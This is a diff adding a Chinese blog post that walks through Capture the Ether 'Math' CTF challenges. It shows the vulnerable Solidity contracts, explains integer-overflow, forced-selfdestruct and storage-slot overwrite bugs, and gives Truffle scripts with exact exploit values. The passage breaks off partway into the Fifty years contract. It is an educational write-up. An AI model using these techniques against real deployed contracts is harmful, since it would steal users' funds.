@@ -267,6 +267,230 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/01/capturetheether-math/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lanford33">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lanford33">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/12/01/capturetheether-math/" itemprop="url">Capturetheether 题解（Math）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-01T10:25:13+08:00">2020-12-01</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Coding/" itemprop="url" rel="index"><span itemprop="name">Coding</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h3><h4 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = <span class="number">1</span> ether;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TokenSaleChallenge</span>(<span class="params">address _player</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance &lt; <span class="number">1</span> ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params">uint256 numTokens</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sell</span>(<span class="params">uint256 numTokens</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件"><a href="#通关条件" class="headerlink" title="通关条件"></a>通关条件</h4><p>使得合约中剩余 ETH 数量小于 1</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>既然要求的是无中生有，那就先从溢出的角度看。代码中的 1 ether 具有一定的迷惑性，如果将 1 ether 视为 1，则代码没问题。但是合约中 ETH 的数量单位其实是 wei，1 ether = 10**18 wei，这么看来 buy 函数中的 numTokens * PRICE_PER_TOKEN 就很有问题了。我们只需要选择一个数让 numTokens * PRICE_PER_TOKEN 溢出，就能够获得超量代币。<br>uint256 为 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff，也就是：</p>
+<p><code>a = 115792089237316195423570985008687907853269984665640564039457584007913129639935</code> </p>
+<p>我们需要他在乘以 10**18 后溢出，简单的处理就是将其最后 18 位截去，再将最后一位加上 1，得到 numTokens:</p>
+<p><code>b = 115792089237316195423570985008687907853269984665640564039458</code> </p>
+<p>相应的 msg.value 就是:</p>
+<p><code>b - a - 1 = 415992086870360064</code></p>
+<p>调用 buy 函数后我们就获得了天量代币，卖出 1 个，就能够获得 1 ETH，成功将合约 ETH 余额降低到 1 以下。</p>
+<p>调用代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract(<span class="string">"TokenSale"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">accounts</span>) </span>&#123;</span><br><span class="line">  it(<span class="string">"should assert true"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> player = accounts[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">let</span> challenge = <span class="keyword">await</span> TokenSale.new(player, &#123;<span class="attr">value</span>: web3.utils.toWei(<span class="string">'1'</span>, <span class="string">'ether'</span>)&#125;)</span><br><span class="line">    <span class="keyword">let</span> num = <span class="keyword">new</span> web3.utils.BN(<span class="string">'115792089237316195423570985008687907853269984665640564039458'</span>)</span><br><span class="line">    <span class="keyword">await</span> challenge.buy(num, &#123;<span class="attr">from</span>: player, <span class="attr">value</span>: <span class="string">'415992086870360064'</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> challenge.sell(<span class="number">1</span>)</span><br><span class="line">    assert(<span class="keyword">await</span> challenge.isComplete() === <span class="literal">true</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><h4 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">"Simple ERC20 Token"</span>;</span><br><span class="line">    string public symbol = <span class="string">"SET"</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TokenWhaleChallenge</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = <span class="number">1000</span>;</span><br><span class="line">        balanceOf[player] = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOf[player] &gt;= <span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params">address to, uint256 value</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint256 value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint256 value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address from, address to, uint256 value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        <span class="built_in">require</span>(allowance[<span class="keyword">from</span>][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件-1"><a href="#通关条件-1" class="headerlink" title="通关条件"></a>通关条件</h4><p>获得超过 1000000 个 token</p>
+<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>还是从溢出的角度看。注意到 transferFrom 调用了 _transfer，而 _transfer 扣除的是 msg.sender 的余额，这可能导致溢出。原因在于，在调用 transferFrom 的时候，msg.sender 很可能只是一个没有持币的代理地址，也就是说 msg.sender 的余额可能为 0，此时被扣除一个正数就会发生溢出。</p>
+<p>调用代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract(<span class="string">"TokenWhale"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">accounts</span>) </span>&#123;</span><br><span class="line">  it(<span class="string">"should assert true"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> player1 = accounts[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">let</span> player2 = accounts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">let</span> recipient = accounts[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">let</span> challenge = <span class="keyword">await</span> TokenWhale.new(player1)</span><br><span class="line">    <span class="keyword">await</span> challenge.approve(player2, <span class="number">1000</span>, &#123;<span class="attr">from</span>: player1&#125;)</span><br><span class="line">    <span class="keyword">await</span> challenge.transferFrom(player1, recipient, <span class="number">1</span>, &#123;<span class="attr">from</span>: player2&#125;)</span><br><span class="line">    <span class="keyword">await</span> challenge.transfer(player1, <span class="number">1000000000</span>, &#123;<span class="attr">from</span>: player2&#125;)</span><br><span class="line">    assert(challenge.isComplete() === <span class="literal">true</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><h4 id="目标合约-2"><a href="#目标合约-2" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + <span class="number">10</span> years;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">RetirementFundChallenge</span>(<span class="params">address player</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (now &lt; expiration) &#123;</span><br><span class="line">            <span class="comment">// early withdrawal incurs a 10% penalty</span></span><br><span class="line">            msg.sender.transfer(address(<span class="keyword">this</span>).balance * <span class="number">9</span> / <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg.sender.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">collectPenalty</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - address(<span class="keyword">this</span>).balance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// an early withdrawal occurred</span></span><br><span class="line">        <span class="built_in">require</span>(withdrawn &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// penalty is what's left</span></span><br><span class="line">        msg.sender.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件-2"><a href="#通关条件-2" class="headerlink" title="通关条件"></a>通关条件</h4><p>取走合约中的所有 ETH</p>
+<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>注意到作为 beneficiary 从合约中取款的必要条件是 <code>startBalance - address(this).balance &gt; 0</code> ，startBalance 和合约目前的 balance 都是 1 ETH。我们只需要让合约的 balance 大于 1 ETH，<code>startBalance - address(this).balance</code> 就会溢出从而使得条件满足。虽然合约中并没有充值函数，也没有 payable fallback 函数，但是我们可以使用 selfdestruct 强制向合约中转入 ETH。所以解题步骤就是：</p>
+<ol>
+<li>部署攻击合约并向合约中充入一点 ETH</li>
+<li>攻击合约自毁，自毁后将 ETH 转入目标合约</li>
+<li>调用目标合约的 collectPenalty 函数</li>
+</ol>
+<h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><h4 id="目标合约-3"><a href="#目标合约-3" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">uint256 key, uint256 value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Expand dynamic array as needed</span></span><br><span class="line">        <span class="keyword">if</span> (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">uint256 key</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通关条件-3"><a href="#通关条件-3" class="headerlink" title="通关条件"></a>通关条件</h4><p>把目标合约的 isComplete 改成 true</p>
+<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>需要我们利用 slot 溢出来修改 Storage 中的数据。isComplete 存储于 slot 0 中，map 定义在 slot 1 中，所以 map 中的元素从 slot keccak256(1)（0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6）开始存储。Storage 中一共有 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 个 slot，所以如果 map 中的元素超过 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - keccak256(1) 就会发生 slot 溢出。我们需要将 slot 0 设置为 1，所以调用 set 函数，参数 key 为 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - keccak256(1) + 1，value 为 1 即可。</p>
+<p>操作代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract(<span class="string">"Mapping"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="regexp">/* accounts */</span></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">"should assert true"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> challenge = <span class="keyword">await</span> Mapping.new()</span><br><span class="line">    <span class="keyword">let</span> gap = <span class="keyword">new</span> web3.utils.BN(<span class="string">'35707666377435648211887908874984608119992236509074197713628505308453184860938'</span>)</span><br><span class="line">    <span class="keyword">await</span> challenge.set(gap, <span class="string">'1'</span>)</span><br><span class="line">    assert(<span class="keyword">await</span> challenge.isComplete() === <span class="literal">true</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><h4 id="目标合约-4"><a href="#目标合约-4" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">DonationChallenge</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">uint256 etherAmount</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">// amount is in ether, but msg.value is in wei</span></span><br><span class="line">        uint256 scale = <span class="number">10</span>**<span class="number">18</span> * <span class="number">1</span> ether;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="通关条件-4"><a href="#通关条件-4" class="headerlink" title="通关条件"></a>通关条件</h4><p>将合约中的 ETH 全部取走</p>
+<h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>单纯看代码的话：</p>
+<ol>
+<li>donate 函数中的 scale 计算逻辑是错误的，合约收取的 ETH 数量将是其记录的金额的 1 / 10**36。</li>
+<li><code>Donation donation</code> 实际上声明了一个未定义指向目标的 Storage pointer，其默认指向位置为 slot 0。这种写法在 solidity 0.5.0 之后将会抛出 error。具体可以参考<a href="https://blog.b9lab.com/storage-pointers-in-solidity-7dcfaa536089" target="_blank" rel="noopener">这篇文章</a>和 <a href="https://docs.soliditylang.org/en/v0.5.10/050-breaking-changes.html" target="_blank" rel="noopener">Solidity 的文档</a>。</li>
+</ol>
+<p>这个合约的 slot 0 存放的是 donations 的长度，slot 1 存放的是 owner。在 <code>donations.push(donation)</code> 执行后，donation.timestamp+1 会覆盖 slot 0 的数据（要 +1 是因为 push 会增加 donations 的长度，所以会让 slot 0 的数据 +1），etherAmount 会覆盖 slot 1 的数据。所以解法就比较明显了–通过 etherAmount 来修改存放在 slot 1 中的 owner。具体来说就是，将自己的地址转换为 uint256 作为 etherAmount，将 <code>etherAmount / 10**36</code> 作为 msg.value 调用 donate 方法即可成为 owner，之后直接调用 withdraw 提现就可通关。</p>
+<h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><h4 id="目标合约-5"><a href="#目标合约-5" class="headerlink" title="目标合约"></a>目标合约</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">FiftyYearsChallenge</span>(<span class="params">address player</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span 